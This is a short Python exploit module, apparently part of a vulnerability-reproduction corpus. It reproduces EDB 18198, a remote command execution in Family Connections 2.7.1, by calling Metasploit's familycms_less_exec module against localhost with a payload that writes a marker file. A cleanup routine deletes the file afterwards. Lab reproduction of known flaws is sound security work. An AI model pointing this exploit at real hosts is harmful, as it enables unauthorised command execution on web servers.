import sys
import os
import time

import selenium.common.exceptions
import corpus

class Exploit (corpus.Exploit):

    def __init__(self):
        corpus.Exploit.__init__(self, {
                'Name' :        "EDB_18198",
                'Description' : "Family Connections less.php Remote Command Execution"
                                "Authentication isn't required to exploit"
				"the vulnerability but register_globals must be set to On."
                                "Requires PHP < 5.4 due to the register_gobals dependancy.",
		'References' :  [['EDB', '18198']],
                'Target' :      "Family Connections 2.7.1",
                'VulWikiPage' : ""
                })
                                
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()

        metasploit_cmd = "metasploit-framework/msfcli multi/http/familycms_less_exec RHOST=127.0.0.1 URI=/family/ PAYLOAD=cmd/unix/generic cmd='echo \"owned\" > /var/www/family/owned.txt' E"
        print "Running Metasploit"
        os.system(metasploit_cmd)

        print "Done! http://localhost/family/owned.txt should now exist."
        driver.cleanup()
        return

    def cleanup(self, system_dir):
        print "Removing /var/www/family/owned.txt"
        os.system("rm " + system_dir + "/var/www/family/owned.txt")
        
        return

if __name__ == "__main__":
    engine = corpus.Engine(Exploit())
    engine.parse_args(sys.argv)
